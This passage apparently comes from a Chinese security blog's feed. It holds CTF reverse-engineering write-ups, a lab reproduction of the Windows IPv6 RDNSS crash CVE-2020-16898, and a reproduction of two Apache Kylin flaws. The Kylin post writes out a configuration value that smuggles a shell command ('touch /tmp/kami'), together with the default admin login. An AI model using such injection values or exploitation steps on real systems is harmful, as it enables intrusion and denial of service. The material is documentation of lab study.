<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092811994.png" alt="image-20201117092811994"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092755620.png" alt="image-20201117092755620"></p>
<h5 id="0x0B-reverse-reverse-for-the-holy-grail"><a href="#0x0B-reverse-reverse-for-the-holy-grail" class="headerlink" title="0x0B reverse reverse-for-the-holy-grail"></a>0x0B reverse reverse-for-the-holy-grail</h5><p>ida分析，可以看到v4的值是判定条件，跟进stringmod看看</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160814789.png" alt="image-20201117160814789"></p>
<p>stringmod:是一大堆函数，理解一下</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160928953.png" alt="image-20201117160928953"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117161027159.png" alt="image-20201117161027159"></p>
<p>编写脚本：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117160731736.png" alt="image-20201117160731736"></p>
<h5 id="0x0C-serial-150（动态调试）"><a href="#0x0C-serial-150（动态调试）" class="headerlink" title="0x0C serial-150（动态调试）"></a>0x0C serial-150（动态调试）</h5><p>ida动态调试：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180507650.png" alt="image-20201117180507650"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/8F5E6F84-02A8-4523-874E-03A0F3AA1C02.png" alt="8F5E6F84-02A8-4523-874E-03A0F3AA1C02"></p>
<p>看到比较长度的代码，10h，所以长度为16</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/915BC464-5DEA-4841-9715-7CACBA9B7E68.png" alt="915BC464-5DEA-4841-9715-7CACBA9B7E68"></p>
<p>比较第一个字符，所以第一个字符是E</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/97BED366-6105-4D26-A4E7-6808DAF3C544.png" alt="97BED366-6105-4D26-A4E7-6808DAF3C544"></p>
<p>第一个字符加上最后一个字符为9B，所以最后一个字符是V(9B-45=56的ascii码)</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/23F762B1-FEB7-48EA-920E-F7F852E166D3.png" alt="23F762B1-FEB7-48EA-920E-F7F852E166D3"></p>
<p>第二位是5A,即Z</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117180907737.png" alt="image-20201117180907737"></p>
<p>第二位和倒数第二位加起来还是9B,倒数第二位是A</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117181154507.png" alt="image-20201117181154507"></p>
<p>按理类推即可：EZ9dmq4c8g9G7bAV</p>
<h5 id="0x0D-babymips（mips-位运算符）"><a href="#0x0D-babymips（mips-位运算符）" class="headerlink" title="0x0D babymips（mips,位运算符）"></a>0x0D babymips（mips,位运算符）</h5><p>下载了一个软件用来反汇编mips</p>
<p>就很清楚了。先比较前五个字符，然后在FUN_004007f0里比较后面的</p>
<p>注意：-的优先级大于^</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083337582.png" alt="image-20201120083337582"></p>
<p>进入函数查看，重点其实就是 b = (a&lt;&lt;0x1a)&gt;&gt;0x18 | a &gt;&gt;6这两句，现在已知b，求a</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120083511211.png" alt="image-20201120083511211"></p>
<p>注意：&lt;&lt;和&gt;&gt;操作是32位的，优先级大于｜</p>
<p>因为a肯定是字符，所以1只会出现在后8位，b也是字符，</p>
<p>那么(a&lt;&lt;0x1a)&gt;&gt;0x18的操作就相当于在原来的后面加两个0，即a&lt;&lt;2</p>
<p>b = a&lt;&lt;2|a&gt;&gt;6</p>
<p>同时byte（8位）对整个式子做了限制（强制转换时计算机只保留其后8位），uint和int修饰第一个式子</p>
<p>所以这个式子需要这样理解：</p>
<p>a&lt;&lt;2，即高两位消失，低两位变0</p>
<p>a&gt;&gt;6，即低六位消失，高两位变成低两位</p>
<p>即循环位移</p>
<p>例如：a =  10100011 </p>
<p>1010001100|0000010 = 1010001110 -&gt;10001110 = b</p>
<p>所以我们的a可以这样用b来表示</p>
<p>a = (b &amp; 00000011(0x3) )&lt;&lt;6|(b &amp; 11111100(0xfc))&gt;&gt;2</p>
<p>或者a = (byte)(b&lt;&lt;6|b&gt;&gt;2)</p>
<p>编写脚本如下：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201120095913785.png" alt="image-20201120095913785"></p>
<h5 id="0x0E-Windows-Reverse2-base64"><a href="#0x0E-Windows-Reverse2-base64" class="headerlink" title="0x0E Windows_Reverse2(base64)"></a>0x0E Windows_Reverse2(base64)</h5><p>先ida看看主函数：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201123170313048.png" alt="image-20201123170313048"></p>
<p>看看401240具体干了什么，有点复杂，再进入401000</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165655973.png" alt="image-20201124165655973"></p>
<p>还是很复杂，决定动态调试看看：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165724832.png" alt="image-20201124165724832"></p>
<p>动态后可以明白401240是先将输入的字符两个两个一组然后代表一位十六进制</p>
<img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201123170618917.png" alt="image-20201123170618917" style="zoom:50%;">

<p>然后401000将前3位和后三位分开，分别经过操作转为4位，最后输出</p>
<p>那么可以编写脚本如下：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201124165542112.png" alt="image-20201124165542112"></p>
<p>最终flag是ADEBDEAEC7BE</p>
<h5 id="0x0F-Windows-Reverse1"><a href="#0x0F-Windows-Reverse1" class="headerlink" title="0x0F Windows_Reverse1"></a>0x0F Windows_Reverse1</h5><p>加壳了：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100611130.png" alt="image-20201125100611130"></p>
<p>脱一下：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100741673.png" alt="image-20201125100741673"></p>
<p>怎么既视感这么强，这是一个系列吗</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125100955283.png" alt="image-20201125100955283"></p>
<p>进入401000看看：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125110924068.png" alt="image-20201125110924068"></p>
<p>看起来只要赋值一下，看看这个402FF8数组</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125111016733.png" alt="image-20201125111016733"></p>
<p>空的，不是很理解，决定动态跑一下，输入了1</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125103632415.png" alt="image-20201125103632415"></p>
<p>可以看到是到aZyxwvutsrqponm这个数组里去找了</p>
<p>但是也不是正常的输入的序号就是对应的第几位</p>
<p>多尝试几个后发现是输入的ascii码-32</p>
<p>所以编写脚本即可：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125111234444.png" alt="image-20201125111234444"></p>
<p>相差的32位是在这里：数组起始位置是2ff8,下面对于开始有字符对应的是3018</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125112156887.png" alt="image-20201125112156887"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x05Cve-2020-16898 复现</title>
    <url>/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="Cve-2020-16898-复现"><a href="#Cve-2020-16898-复现" class="headerlink" title="Cve-2020-16898 复现"></a>Cve-2020-16898 复现</h3><p>参考：</p>
<p><a href="https://blog.csdn.net/hsj_csdn/article/details/109138162">https://blog.csdn.net/hsj_csdn/article/details/109138162</a></p>
<p><a href="https://www.secpulse.com/archives/143665.html">https://www.secpulse.com/archives/143665.html</a></p>
<p><a href="https://cert.360.cn/report/detail?id=771d8ddc2d703071d5761b6a2b139793">https://cert.360.cn/report/detail?id=771d8ddc2d703071d5761b6a2b139793</a></p>
<a id="more"></a>

<h4 id="0x1-复现过程："><a href="#0x1-复现过程：" class="headerlink" title="0x1 复现过程："></a>0x1 复现过程：</h4><h5 id="0x01-准备靶机环境"><a href="#0x01-准备靶机环境" class="headerlink" title="0x01 准备靶机环境"></a>0x01 准备靶机环境</h5><p>下一个win10的镜像，然后开启vmware的IPV6功能（编辑-虚拟网络编辑器-NAT设置），查看靶机IPV6地址</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173742012.png" alt="image-20201109173742012"></p>
<h5 id="0x02-攻击机运行脚本（攻击机需要能与靶机进行通信"><a href="#0x02-攻击机运行脚本（攻击机需要能与靶机进行通信" class="headerlink" title="0x02 攻击机运行脚本（攻击机需要能与靶机进行通信"></a>0x02 攻击机运行脚本（攻击机需要能与靶机进行通信</h5><p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173451963.png" alt="image-20201109173451963"></p>
<h5 id="0x03-攻击成功，靶机蓝屏重启"><a href="#0x03-攻击成功，靶机蓝屏重启" class="headerlink" title="0x03 攻击成功，靶机蓝屏重启"></a>0x03 攻击成功，靶机蓝屏重启</h5><p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173816856.png" alt="image-20201109173816856"></p>
<h4 id="0x2-漏洞部分分析："><a href="#0x2-漏洞部分分析：" class="headerlink" title="0x2 漏洞部分分析："></a>0x2 漏洞部分分析：</h4><p>0x01 抓包，可以看到进行了多次DNS查询</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173845156.png" alt="image-20201109173845156"></p>
<h4 id="0x3-原理分析："><a href="#0x3-原理分析：" class="headerlink" title="0x3 原理分析："></a>0x3 原理分析：</h4><h6 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h6><p>1、Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。</p>
<p>2、RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option</p>
<p>3、Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。</p>
<p>4、IPv6 Router Advertisment (RA) options，也称为DNS RA  options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server  Address(DNS递归路由器地址)列表和DNS Search  List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。该信息使用现有ND message(例如RA)作为载体。IPv6主机可以通过RA消息配置一个或多个RDNSS的IPv6地址。当主机接收到RA消息中的DNS的options时，其处理过程如下：1、首先检查Lengh字段的合法性：是否大于等于最小值3，以及是否满足(Length - 1) % 2 == 0；2、对于RDNSS option，还会检查Address字段是否为一个单播地址；3、如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。</p>
<p>5、GS机制：</p>
<p>GS机制分三个步骤：计算随机种子 –&gt; canary写入栈帧 –&gt; GS校验</p>
<p>1、程序启动时，读取**.data<strong>的第一个</strong>DWORD**作为基数，然后和各种元素（时间戳，进程ID，线程ID，计数器等等）进行XOR加密</p>
<p>2、然后将加密后的种子再次写入**.data<strong>的第一个</strong>DWORD**</p>
<p>3、函数在执行前，把加密后的种子取出，与当前<strong>esp</strong>进行异或计算，结果存入EBP的前面</p>
<p>4、函数主体正常执行。</p>
<p>5、<strong>函数返回前</strong>（retn前一点），把cookie取出与esp异或计算后，调用__security_check_cookie函数进行检查，与.data节里的种子进行比较，</p>
<p>如果校验通过，则返回原函数继续执行；如果校验失败，则程序终止。</p>
<p>6、通过RFC8106的标准中对RDNSS option结构的定义（<a href="https://tools.ietf.org/pdf/rfc8106.pdf%EF%BC%89">https://tools.ietf.org/pdf/rfc8106.pdf）</a></p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173914793.png" alt="image-20201109173914793"></p>
<p>Type： 占8-bit，RDNSS 的类型为25</p>
<p>Length：8-bit无符号整数，单位长度为8个字节，所以Type, Length, Reserved, Lifetime一共占8个字节，一个单位长度，而一个IPv6地址占16个字节，两个单位长度，所以Length的最小值为3，且为奇数。</p>
<p>Reserved：保留字段</p>
<p>Lifetime：32-bit无符号整数，存活周期。</p>
<p>Addresses of IPv6 Recursive DNS Servers：保存RNDSS的IPv6地址，每个占16个字节，地址的数量会影响Length字段，number=(Length - 1) / 2。每增加一个地址，Length加2。</p>
<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>由于Windows TCP/IP堆栈在处理选项类型为25(0x19，递归DNS服务器选项)，当伪造长度字段值为偶数的ICMPv6的路由广播数据包发送给目标主机时，Windows TCP/IP 在检查包过程中会根据Length来获取每个包的偏移，遍历解析，导致对 Addresses of IPv6 Recursive DNS  Servers 和下一个 RDNSS 选项的边界解析错误，从而绕过验证，将攻击者伪造的option包进行解析，造成栈溢出，从而导致系统崩溃。</p>
<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>1、从靶机中导出蓝屏日志文件dmp（在windows\minidump中），使用windbg来分析</p>
<p>遇到的问题：不能正常加载符号表</p>
<p>解决：因为时效问题，搜索了很多方法都无效，最终使用科学上网自动加载符号表解决</p>
<p>2、kv语句查看（Kv，命令用来显示当前线程的堆栈，显示FPO和调用约定）</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173936731.png" alt="image-20201109173936731"></p>
<p>可以看到GS机制的Security Cookie校验失败，也就是说该值被覆盖掉了。</p>
<p>分析出现的关键函数tcpip!Ipv6pHandleRouterAdvertisement()。</p>
<p>3、使用IDA64反编译驱动程序tcpip.sys（win10 1909版本）</p>
<p>找到函数tcpip!Ipv6pHandleRouterAdvertisement()</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173949807.png" alt="image-20201109173949807"></p>
<p>函数一开始就写出了GS机制：</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174004821.png" alt="image-20201109174004821"></p>
<p>查看调用的函数，发现Ipv6pUpdateRDNSS()</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174021022.png" alt="image-20201109174021022"></p>
<p>进入漏洞函数Ipv6pUpdateRDNSS()：</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174048451.png" alt="image-20201109174048451"></p>
<p>通过查询微软官方文档理解出现的几个函数</p>
<p>我们可以理解下面的循环是，确认Address的数量，对每个Address进行处理，分配合适的内存。</p>
<p>而漏洞原因就在于v41处未对length奇偶进行判断</p>
<p>根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。那么当我们提供一个偶数Length值如4时，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区。但是此代码中，可以看到堆栈在内部以16字节为增量进行计数，当v41为1时，分配的缓冲区是v9的8字节加上v19的16字节，最终为24字节，就会导致缓冲区溢出。</p>
<p><strong>注意</strong>：如果从NetBuffer请求的数据是连续的，则会将数据存放在NDIS提供的地址，这样无法造成溢出。所以需要从NetBuffer请求的数据不是连续的，才会将数据存放在Storage上。数据非连续的实现是通过fragmentation（碎片化）处理，将Router Advertisement包通过scapy的fragment6函数拆分成多个IPv6 fragments进行发送。</p>
<p>查看复现中抓取的Router Advertisement流量包，可以看到其中length为偶数8</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174105003.png" alt="image-20201109174105003"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>windows内核</tag>
        <tag>ipv6</tag>
      </tags>
  </entry>
  <entry>
    <title>0x05Xctf进阶刷题-3 --更新中</title>
    <url>/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/</url>
    <content><![CDATA[<p>XCTF进阶刷题-3</p>
<a id="more"></a>

<h5 id="0x01-easyre-153（sigchld）"><a href="#0x01-easyre-153（sigchld）" class="headerlink" title="0x01 easyre-153（sigchld）"></a>0x01 easyre-153（sigchld）</h5><p>ida分析主函数，了解了sigchild后，猜测if(!v5)这里应该是属于子进程，动态调试看看</p>
<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144348053.png" alt="image-20201126144348053"></p>
<p>运行后会接收到信号值tid</p>
<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144442776.png" alt="image-20201126144442776"></p>
<p>v6 = v5就是对比esp+24h和esp+20h，输入tid值后发现还是不对，对比后尝试输入tid+2即可（不知道原因</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144950878.png" alt="image-20201126144950878"></p>
<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126144850862.png" alt="image-20201126144850862"></p>
<p>然后就会继续运行，看到flag_is_not_here我愣住了，还以为理解错了</p>
<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126141821555.png" alt="image-20201126141821555"></p>
<p>去看看lol函数，发现是对buf做一些操作，buf就是69800那一串数字，可以动态看看最后生成的字符串，就是rhelheg，即flag</p>
<p><img src="/2020/11/26/0x05Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-3/image-20201126143402449.png" alt="image-20201126143402449"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
<a id="more"></a>

<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>

<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
<p>0x002 发包，可以看到返回200</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
<p>0x002 改包，即可</p>
<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
<p>这里有一个额外的知识：burp的collaborator模块</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>kylin</tag>
      </tags>
  </entry>
  <entry>
    <title>0x06buuctfWP-1</title>
    <url>/2021/01/18/0x06buuctfWP-1/</url>
    <content><![CDATA[<p>buuctf刷题</p>
<a id="more"></a>

<h5 id="0x01-2019红帽杯easyre-2020-11-30"><a href="#0x01-2019红帽杯easyre-2020-11-30" class="headerlink" title="0x01 2019红帽杯easyre 2020.11.30"></a>0x01 2019红帽杯easyre 2020.11.30</h5><p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201085705304.png" alt="image-20201201085705304"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201085742513.png" alt="image-20201201085742513"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201130171506491.png" alt="image-20201130171506491"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201085616273.png" alt="image-20201201085616273"></p>
<h5 id="0x02-相册"><a href="#0x02-相册" class="headerlink" title="0x02 相册"></a>0x02 相册</h5><p>感觉这题目稍微简单了点</p>
<p>看java文件，C2似乎会有一些定义，看看C2</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201092820389.png" alt="image-20201201092820389"></p>
<p>猜测这个就是要发送的邮箱，经过base64解密 <img src="/2021/01/18/0x06buuctfWP-1/image-20201201092854869.png" alt="image-20201201092854869"></p>
<p>定义在so文件里了</p>
<img src="/2021/01/18/0x06buuctfWP-1/image-20201201092915874.png" alt="image-20201201092915874" style="zoom:50%;">

<p>打开so文件看到一些字符串，放到base64解一下试试</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201092934423.png" alt="image-20201201092934423"></p>
<p>提交了即可</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201093307175.png" alt="image-20201201093307175"></p>
<h5 id="0x03-Universe-final-answer"><a href="#0x03-Universe-final-answer" class="headerlink" title="0x03 Universe_final_answer"></a>0x03 Universe_final_answer</h5><p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201105908201.png" alt="image-20201201105908201"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201105920622.png" alt="image-20201201105920622"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201105853132.png" alt="image-20201201105853132"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201105757817.png" alt="image-20201201105757817"></p>
<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><img src="/2021/01/18/0x06buuctfWP-1/image-20201201154823295.png" alt="image-20201201154823295" style="zoom:50%;">

<img src="/2021/01/18/0x06buuctfWP-1/image-20201201154838647.png" alt="image-20201201154838647" style="zoom:50%;">

<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201145640995.png" alt="image-20201201145640995"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201150351743.png" alt="image-20201201150351743"></p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20201201154732373.png" alt="image-20201201154732373"></p>
<h5 id="0x05-新年快乐-2021-1-5"><a href="#0x05-新年快乐-2021-1-5" class="headerlink" title="0x05 新年快乐 2021.1.5"></a>0x05 新年快乐 2021.1.5</h5><p>好久没做题了，最近在重刷408的一些知识来着…</p>
<p>upx脱壳</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210105142217660.png" alt="image-20210105142217660"></p>
<p>啊这，flag就很明显是HappyNewYear!了</p>
<h5 id="0x06-MRCTF2020-Transform1"><a href="#0x06-MRCTF2020-Transform1" class="headerlink" title="0x06 [MRCTF2020]Transform1"></a>0x06 [MRCTF2020]Transform1</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span><br><span class="line">#define HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span><br><span class="line">#define LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span><br><span class="line">#define HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span><br></pre></td></tr></table></figure>

<p>无壳，主函数如下：</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210111101152811.png" alt="image-20210111101152811"></p>
<p>流程：输入的字符串存储到v6，然后根据dword_40f040[i]的顺序将v6的值赋给byte_414040，然后和dword_40f040[i]的低8位做异或，得到的值和byte_40f0e0相同即可</p>
<p><img src="/2021/01/18/0x06buuctfWP-1/image-20210111101618314.png" alt="image-20210111101618314"></p>
<h5 id="0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）2021-1-12"><a href="#0x07-ACTF新生赛2020-SoulLike-（python爆破-pwn-re）2021-1-12" class="headerlink" title="0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）2021.1.12"></a>0x07 [ACTF新生赛2020]SoulLike （python爆破 pwn/re）2021.1.12</h5><p>无壳</p>
<p>主函数，前五位可知是actf{，最后一位是}，中间我们输入的字符经过了sub_55D038那个函数的判定</p>
